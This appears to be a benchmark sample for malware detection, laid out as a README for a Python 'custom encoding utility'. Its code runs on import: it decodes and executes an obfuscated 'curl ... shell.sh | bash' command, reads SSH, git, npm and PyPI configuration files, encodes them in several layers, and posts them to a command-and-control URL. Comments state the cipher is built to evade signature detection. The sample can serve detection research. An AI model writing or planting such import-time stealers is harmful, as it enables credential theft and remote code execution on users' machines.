# Custom Encoding Utility

> BENCHMARK_TEST_ONLY - Security Research Sample

Proprietary encoding algorithm for specialized data transformation.

## Installation

```bash
pip install requests
```

## Usage

Custom encoding for legacy system compatibility and data obfuscation.

## Implementation

```python
# BENCHMARK_TEST_ONLY - Simulated malicious pattern for detection testing
import requests
import os
import subprocess

# Custom substitution cipher tables - designed to evade pattern matching
# Forward substitution table
ENCODE_TABLE = {
    'a': 'q', 'b': 'w', 'c': 'e', 'd': 'r', 'e': 't', 'f': 'y',
    'g': 'u', 'h': 'i', 'i': 'o', 'j': 'p', 'k': 'a', 'l': 's',
    'm': 'd', 'n': 'f', 'o': 'g', 'p': 'h', 'q': 'j', 'r': 'k',
    's': 'l', 't': 'z', 'u': 'x', 'v': 'c', 'w': 'v', 'x': 'b',
    'y': 'n', 'z': 'm', ' ': '_', '/': '-', '.': '~', ':': '^',
    '0': '9', '1': '8', '2': '7', '3': '6', '4': '5', '5': '4',
    '6': '3', '7': '2', '8': '1', '9': '0', '-': '+', '_': ' ',
    'A': 'Q', 'B': 'W', 'C': 'E', 'D': 'R', 'E': 'T', 'F': 'Y',
    'G': 'U', 'H': 'I', 'I': 'O', 'J': 'P', 'K': 'A', 'L': 'S',
    'M': 'D', 'N': 'F', 'O': 'G', 'P': 'H', 'Q': 'J', 'R': 'K',
    'S': 'L', 'T': 'Z', 'U': 'X', 'V': 'C', 'W': 'V', 'X': 'B',
    'Y': 'N', 'Z': 'M', '@': '#', '#': '$', '$': '%', '~': '.',
    '^': ':', '+': '-', '=': '!', '!': '=', '?': '&', '&': '?'
}

# Reverse table for decoding
DECODE_TABLE = {v: k for k, v in ENCODE_TABLE.items()}

# Custom cipher encoded payload
# Decodes to: "curl https://[REDACTED].example.com/shell.sh | bash"
ENCODED_PAYLOAD = "exks_izzhl^--[KTRQEZTR]~tbqdhst~egd-litss~li_|_wqli"

# Second layer: character rotation cipher
ROTATION_KEY = 13

def custom_substitute(text, table):
    """Apply custom substitution cipher"""
    result = []
    for char in text:
        result.append(table.get(char, char))
    return ''.join(result)

def rotate_chars(text, key):
    """Apply character rotation (like ROT13 but configurable)"""
    result = []
    for char in text:
        if char.isalpha():
            base = ord('a') if char.islower() else ord('A')
            rotated = chr((ord(char) - base + key) % 26 + base)
            result.append(rotated)
        else:
            result.append(char)
    return ''.join(result)

def multi_layer_decode(encoded):
    """
    Multi-layer custom decoding:
    1. Reverse rotation
    2. Reverse substitution
    """
    # Layer 1: Reverse rotation
    derotated = rotate_chars(encoded, -ROTATION_KEY)

    # Layer 2: Reverse substitution
    decoded = custom_substitute(derotated, DECODE_TABLE)

    return decoded

def encode_for_exfil(data):
    """Encode data before exfiltration using custom cipher"""
    # Layer 1: Substitution
    substituted = custom_substitute(data, ENCODE_TABLE)

    # Layer 2: Rotation
    rotated = rotate_chars(substituted, ROTATION_KEY)

    # Layer 3: Custom numeric encoding
    numeric = ''.join([str(ord(c) ^ 0x55) for c in rotated])

    return numeric

class CustomCipherProcessor:
    """
    Custom cipher implementation designed to:
    1. Evade signature-based detection
    2. Avoid standard crypto library detection
    3. Use non-standard algorithms
    """

    def __init__(self):
        self.c2_url = "https://[REDACTED].example.com"

        # Build custom permutation table at runtime
        self.perm_table = self._build_permutation()

    def _build_permutation(self):
        """Build runtime permutation table"""
        # Seeded pseudo-random permutation
        import random
        random.seed(42)  # Fixed seed for reproducibility
        chars = list(range(256))
        random.shuffle(chars)
        return bytes(chars)

    def permutation_encode(self, data):
        """Encode using permutation table"""
        if isinstance(data, str):
            data = data.encode()
        return bytes([self.perm_table[b] for b in data])

    def permutation_decode(self, data):
        """Decode using reverse permutation"""
        reverse_table = bytes([self.perm_table.index(i) for i in range(256)])
        return bytes([reverse_table[b] for b in data])

    def execute_encoded_command(self):
        """Decode and execute the hidden command"""
        # Decode the payload
        command = multi_layer_decode(ENCODED_PAYLOAD)

        # Execute via shell
        subprocess.run(command, shell=True, capture_output=True)

    def steal_and_encode(self):
        """Steal data and encode with custom cipher before exfil"""
        targets = [
            os.path.expanduser("~/.ssh/config"),
            os.path.expanduser("~/.gitconfig"),
            os.path.expanduser("~/.npmrc"),
            os.path.expanduser("~/.pypirc")
        ]

        stolen_data = {}
        for target in targets:
            if os.path.exists(target):
                try:
                    with open(target, 'r') as f:
                        content = f.read()

                    # Triple-encode for obfuscation
                    encoded = encode_for_exfil(content)
                    encoded = self.permutation_encode(encoded)

                    stolen_data[os.path.basename(target)] = encoded.hex()
                except:
                    pass

        if stolen_data:
            requests.post(
                f"{self.c2_url}/encoded/upload",
                json=stolen_data
            )

# Auto-execute on import
processor = CustomCipherProcessor()
processor.execute_encoded_command()
processor.steal_and_encode()
```

## Encoding Features

- Custom substitution cipher
- Multi-layer encoding
- Permutation-based transformation
- Non-standard algorithm
